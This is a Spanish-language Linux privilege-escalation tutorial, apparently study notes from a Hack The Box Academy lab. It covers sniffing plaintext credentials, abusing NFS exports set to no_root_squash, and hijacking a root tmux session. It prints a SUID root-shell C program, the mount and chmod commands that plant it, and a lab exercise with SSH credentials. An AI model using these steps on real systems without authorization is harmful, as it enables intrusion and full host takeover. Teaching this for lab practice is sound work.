
# Técnicas varias

## <mark style="color:purple;">Captura de tráfico pasivo</mark>

Si `tcpdump` está instalado, los usuarios sin privilegios pueden capturar el tráfico de la red, incluidas, en algunos casos, las credenciales que se pasan en texto sin formato. Existen varias herramientas, como [net-creds](https://github.com/DanMcInerney/net-creds) y [PCredz](https://github.com/lgandx/PCredz) , que se pueden utilizar para examinar los datos que se pasan por la red. Esto puede dar como resultado la captura de información confidencial, como números de tarjetas de crédito y cadenas de comunidad SNMP. También es posible capturar hashes Net-NTLMv2, SMBv2 o Kerberos, que podrían estar sujetos a un ataque de fuerza bruta sin conexión para revelar la contraseña en texto sin formato. Los protocolos de texto sin formato, como HTTP, FTP, POP, IMAP, telnet o SMTP, pueden contener credenciales que se podrían reutilizar para aumentar los privilegios en el host.

<figure><img src="/files/WwrpY8Vc7UgdAAbxlBh2" alt=""><figcaption><p>Net-creds capturando credenciales en red</p></figcaption></figure>

***

## <mark style="color:purple;">Privilegios NFS débiles</mark>

El sistema de archivos de red (NFS) permite a los usuarios acceder a archivos o directorios compartidos a través de la red alojada en sistemas Unix/Linux. NFS utiliza el puerto TCP/UDP 2049. Cualquier montaje accesible se puede enumerar de forma remota mediante la emisión del comando `showmount -e`, que enumera la lista de exportación del servidor NFS (o la lista de control de acceso para sistemas de archivos) que los clientes NFS tienen.

```shell-session
afsh4ck@kali$ showmount -e 10.129.2.12

Export list for 10.129.2.12:
/tmp             *
/var/nfs/general *
```

Cuando se crea un volumen NFS, se pueden configurar varias opciones:

<table data-header-hidden><thead><tr><th width="193"></th><th></th></tr></thead><tbody><tr><td>Opción</td><td>Descripción</td></tr><tr><td><code>root_squash</code></td><td>Si se utiliza el usuario root para acceder a los recursos compartidos de NFS, se cambiará al <code>nfsnobody</code>usuario que es una cuenta sin privilegios. Todos los archivos creados y cargados por el usuario root serán propiedad del <code>nfsnobody</code>usuario, lo que evita que un atacante cargue archivos binarios con el bit SUID activado.</td></tr><tr><td><code>no_root_squash</code></td><td>Los usuarios remotos que se conecten al recurso compartido como usuario raíz local podrán crear archivos en el servidor NFS como usuario raíz. Esto permitiría la creación de scripts o programas maliciosos con el bit SUID activado.</td></tr></tbody></table>

```shell-session
htb@NIX02:~$ cat /etc/exports

# /etc/exports: the access control list for filesystems which may be exported
#		to NFS clients.  See exports(5).
#
# Example for NFSv2 and NFSv3:
# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
#
# Example for NFSv4:
# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
#
/var/nfs/general *(rw,no_root_squash)
/tmp *(rw,no_root_squash)
```

Por ejemplo, podemos crear un binario SETUID que se ejecute `/bin/sh` utilizando nuestro usuario root local. Luego podemos montar el directorio `/tmp` localmente, copiar el binario propiedad del usuario root al servidor NFS y configurar el bit SUID.

Primero, cree un binario simple, monte el directorio localmente, cópielo y configure los permisos necesarios.

```shell-session
htb@NIX02:~$ cat shell.c 

#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>

int main(void)
{
  setuid(0); setgid(0); system("/bin/bash");
}
```

```shell-session
htb@NIX02:/tmp$ gcc shell.c -o shell
```

```shell-session
root@kali:~$ sudo mount -t nfs 10.129.2.12:/tmp /mnt
root@kali:~$ cp shell /mnt
root@kali:~$ chmod u+s /mnt/shell
```

Cuando volvemos a la sesión con pocos privilegios del host, podemos ejecutar el binario y obtener un shell root.

```shell-session
htb@NIX02:/tmp$  ls -la

total 68
drwxrwxrwt 10 root  root   4096 Sep  1 06:15 .
drwxr-xr-x 24 root  root   4096 Aug 31 02:24 ..
drwxrwxrwt  2 root  root   4096 Sep  1 05:35 .font-unix
drwxrwxrwt  2 root  root   4096 Sep  1 05:35 .ICE-unix
-rwsr-xr-x  1 root  root  16712 Sep  1 06:15 shell
<SNIP>
```

```shell-session
htb@NIX02:/tmp$ ./shell
root@NIX02:/tmp# id

uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare),1000(htb)
```

***

## <mark style="color:purple;">Secuestro de sesiones de Tmux</mark>

Los multiplexores de terminal como [tmux](https://en.wikipedia.org/wiki/Tmux) se pueden utilizar para permitir el acceso a varias sesiones de terminal dentro de una única sesión de consola. Cuando no se trabaja en una ventana `tmux`, podemos desconectarnos de la sesión, dejándola activa (es decir, ejecutando un análisis `nmap`). Por muchas razones, un usuario puede dejar un proceso `tmux` ejecutándose como un usuario privilegiado, como root configurado con permisos débiles, y puede ser secuestrado. Esto se puede hacer con los siguientes comandos para crear una nueva sesión compartida y modificar la propiedad.

```shell-session
htb@NIX02:~$ tmux -S /shareds new -s debugsess
htb@NIX02:~$ chown root:devs /shareds
```

Si podemos comprometer a un usuario en el grupo `dev`, podemos unirnos a esta sesión y obtener acceso root.&#x20;

#### Verifique si hay algún proceso `tmux` en ejecución.

```shell-session
htb@NIX02:~$  ps aux | grep tmux

root      4806  0.0  0.1  29416  3204 ?        Ss   06:27   0:00 tmux -S /shareds new -s debugsess
```

#### Confirmar permisos

```shell-session
htb@NIX02:~$ ls -la /shareds 

srw-rw---- 1 root devs 0 Sep  1 06:27 /shareds
```

#### Revisar nuestra membresía grupal

```shell-session
htb@NIX02:~$ id

uid=1000(htb) gid=1000(htb) groups=1000(htb),1011(devs)
```

#### Por último, conéctese a la sesión  `tmux` y confirme los privilegios de root.

```shell-session
htb@NIX02:~$ tmux -S /shareds

id

uid=0(root) gid=0(root) groups=0(root)
```

***

## <mark style="color:purple;">Caso práctico</mark>

```
SSH a 10.129.2.210 (ACADEMY-LPE-NIX02)
Usuario "htb-student"
Contraseña "Academy_LLPE!"
```

Revise la lista de exportaciones del servidor NFS y busque un directorio que contenga una flag.

***

Vamos a utilkizar showmount para ver el listado de exportaciones NFS:

```shell-session
afsh4ck@kali$ showmount -e 10.129.2.210
Export list for 10.129.2.210:
/tmp             *
/var/nfs/general *
```

Al acceder a `/var/nfs/general` encontramos el archivo `exports_flag.txt`:

<figure><img src="/files/OS314FB9E0b1sjkbeqsl" alt=""><figcaption></figcaption></figure>
